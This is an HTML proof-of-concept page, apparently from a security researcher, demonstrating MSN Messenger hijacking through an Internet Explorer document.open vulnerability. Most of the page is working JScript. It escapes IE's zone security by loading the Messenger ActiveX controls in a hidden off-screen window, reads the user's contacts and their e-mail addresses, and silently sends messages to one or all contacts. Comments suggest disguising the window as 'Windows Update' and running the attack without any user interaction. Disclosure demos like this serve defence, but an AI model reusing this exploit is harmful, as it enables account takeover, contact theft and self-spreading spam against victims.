<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">

<head>
	<title>MSN Messenger Hijacking - Demonstration</title>
	<link rel="stylesheet" title="Default style" href="/css/msn.css" media="all" />
	<script type="text/javascript">
	<!--

	/*@cc_on @*/
	/*@if (@_jscript_version > 4)@*/
		
		if (!window.showModalDialog)
		{
			alert("Sorry, this example is IE4+ only.\n\nNon-IE browsers do not have this vulnerability.");
		}
			else
		{
			var msnList;
			var msnWin;
			var msnTimer;
			var attemptAutoLogin;

			// This is the message to send to users
			var msgStr = "Hello, my MSN has just been h4><0r3d. However, this is nothing to be worried about. Your MSN is fine. The person who sent this would probably like a reply though, to show that it worked.\r\n\r\nFor more information on this, please visit http://tom.me.uk/msn/";

			function msnLoad()
			{
				alert("I'm about to attempt to load MSN.\n\nIf MSN is not already open, this might take a few seconds.");
				msnContainer.innerText = "Loading MSN contacts, please wait...";

				// This is the line that causes it all. Instead of calling window.open, we
				// call document.open - this gets totally round all IE domain security.
				msnWin = document.open("res://mshtml.dll/blank.htm", "", "fullscreen=1");

				try
				{
					alert(msnWin.location.href);
				}
					catch(errObj)
				{
					alert("Congratulations, you appear to be patched against this problem.");
					msnWin.close();
					msnReset();
					return false;
				}

				// Resize and move the new window, so its out of sight
				msnWin.resizeTo(1, 1);
				msnWin.moveTo(10000, 10000);

				// You could change "MSN Test" to something like "Windows Update"
				msnWin.document.title = "MSN Test";

				// Load the MSN ActiveX controls in the new window
				msnWin.document.body.innerHTML = '<object classid="clsid:F3A614DC-ABE0-11d2-A441-00C04F795683" id="msnObj1"></object><object classid="clsid:FB7199AB-79BF-11d2-8D94-0000F875C541" id="msnObj2"></object>';

				// Get window focus back
				focus();

				// See if we can contact the ActiveX objects
				if (!msnWin.msnObj1)
				{
					alert("Couldn't make contact with the MSN ActiveX object. You might have your IE security settings changed, or have a patched IE.");
				}
					// Check if MSN is offline
					else if (msnWin.msnObj1.localState == 1)
				{	
					try {
						// Attempt to automatically login
						msnWin.msnObj2.autoLogon();
					} catch (e) {
						// Couldn't auto-login, so show the login UI
						msnWin.msnObj2.launchLogonUI();
					}
					
					// Attept to load the contact list every second
					msnTimer = setInterval("try { if (msnWin.msnObj1.localState != 1) { clearInterval(msnTimer); showContacts(); } } catch (e) { msnError(); }", 1000);
				}
					else
				{
					// MSN is logged in, all is fine, show the contacts
					showContacts();
				}
			}

			function showContacts()
			{
				try
				{
					if (msnWin.msnObj1.localState == 1)
					{
						// MSN is offline, show error message
						msnError();
						return false;
					}

					// Set the list object
					msnList = msnWin.msnObj1.list(0);

					// Print the contact list out
					var msnStr = "<b>Online contacts for " + msnWin.msnObj1.localLogonName + ":</b><br>";
					for (i=0;i<msnList.count;i++) if (msnList(i).state > 1) msnStr += "Contact " + (i+1) + ": " + msnList(i).FriendlyName + ", state: " + msnList(i).State + ", e-mail: " +  msnList(i).LogonName + ' - <span tabindex="0" class="link" onclick="sendMsg('+i+')">Send message</span><br>';
					msnContainer.innerHTML = msnStr + "<br><button onclick='msnSendAll()'>Send message to all contacts</button>";

					// Set button to close contacts when clicked
					msnLoadBtn.innerText = "Close MSN Contacts";
					msnLoadBtn.onclick = msnClose;

					// Update the contacts in 3 seconds
					msnTimer = setTimeout("showContacts()", 3000);
				}
					catch (e)
				{
					// There was a problem showing the contacts, show error
					msnError();
				}
			}
	
			function msnError()
			{
				// Something has gone wrong, abort!
				alert("Sorry, there was an error showing the contact list.\n\nYou might have closed the MSN Test window, or been logged out of MSN.\n\nClick the \"Load MSN Contacts\" button to try again.");
				msnReset();
			}

			function msnReset()
			{
				// Resets everything back to default
				clearInterval(msnTimer);
				msnWin = null;
				msnLoadBtn.innerText = "Load MSN Contacts";
				msnLoadBtn.onclick = msnLoad;
				msnContainer.innerText = "";
			}

			function sendMsg(contact, prompt)
			{
				// Get the user's friendly name
				var msnUser = msnList(contact).friendlyName;

				// Prompt to send message
				if (!prompt || confirm("This will send a nice message to MSN user \"" + msnUser + "\". Continue?"))
				{
					// This is the line that actually sends the message
					msnList(contact).sendText("MIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\n\r\n", msgStr, 0);
					// Confirm message has been sent
					alert("Message has just been sent to \"" + msnUser + "\".\n\nNo MSN dialogs should have appeared.\n\nThis script could have easily sent the message without\nany interaction from you.");
				}
			}

			function msnSendAll()
			{
				// Sends a message to all contacts
				if (confirm("This will send a nice message to all contacts on your list. Continue?"))
					for (var i=0; i<msnList.count; i++) sendMsg(i, false);
			}

			onload = function()
			{
				msnLoadBtn.disabled = false;
			}

			onerror = function()
			{
				alert("Sorry, there was an error in the script.\n\nThis may well be due to your IE security settings - try resetting them to default and trying again.\n\nAlso please check you are running and logged into MSN, using the official MSN client - *NOT* a 3rd party application such as Trillian.");
			}

			onunload = function msnClose()
			{
				// Disable error messages
				onerror = function() { return true; }

				if (msnWin && !msnWin.closed)
				{
					// Clear timer, close window, msnReset
					clearInterval(msnTimer);
					msnWin.close();
					msnReset();
				}
			}
		}
	
	/*@else @*/
		alert("Sorry, this requires JScript version 5 or better.\n\nIt could be made to work with previous versions, but I'm lazy :D");		
	/*@end @*/

	-->
	</script>

</head>

<body>

<h1>MSN Hijacking - Demonstration</h1>

<p>
	<a href="/msn/">MSN Messenger Hijacking security bulletin</a>
</p>

<noscript><p><b>YOU MUST ENABLE ACTIVE SCRIPTING FOR THIS PAGE TO DO ANYTHING</b></p></noscript>

<p>
	Click the MSN button below and IE will load another window containing the MSN Messenger ActiveX objects, but in the My Computer security zone. I then have full access to your contact list - including sending messages without you knowing. Sending files is also possible.
</p>

<p>
	This is all down to the document.open IE vulnerability discovered by <a href="http://www.osioniusx.com/">The Pull</a>, see the <a href="http://www.securityfocus.com/bid/3721">SecurityFocus page</a> for more information.
</p>

<p>
	All of what this page does could easily be done automatically and with no user interaction (if MSN is already running, or set to login automatically). It could also be done via an email within Outlook or OE, if the security rules allowed scripting.
</p>

<p>
	<b>Please login to MSN Messenger before attempting to load contacts, using the official MSN client (not a 3rd party application such as <a href="http://www.trillian.cc">Trillian</a>). You also must have scripting, ActiveX and scripting of ActiveX enabled (the default IE rules for the internet zone stipulate this).</b>
</p>

<p><button onclick="msnLoad()" disabled="disabled" id="msnLoadBtn">Load MSN contacts</button></p>

<p id="msnContainer"></p>

</body>
</html>